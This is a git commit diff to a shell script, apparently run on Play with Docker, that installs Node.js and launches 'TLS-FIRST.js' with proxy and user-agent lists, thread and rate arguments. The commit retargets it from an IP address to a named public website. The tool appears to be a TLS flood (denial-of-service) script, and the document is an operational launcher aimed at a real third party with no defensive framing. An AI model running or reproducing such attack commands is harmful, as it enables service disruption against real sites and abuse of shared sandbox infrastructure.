9f4cf31d51a5e8bd68b4c8ca3f52eead0ac3a8a7
GolubevsEv <124365636+GolubevsEv@users.noreply.github.com>
2023-06-18 00:17:55 +0300

    Update PlaywithDocker.sh

--- PlaywithDocker.sh
+++ PlaywithDocker.sh
@@ -6,4 +6,4 @@ bash install.sh -y
 apk add nodejs
 apk add npm
 npm i colors
-node TLS-FIRST.js http://88.198.48.45 3000 proxy.txt ua.txt 10 128
+node TLS-FIRST.js https://zetvideo.net 3000 proxy.txt ua.txt 10 128
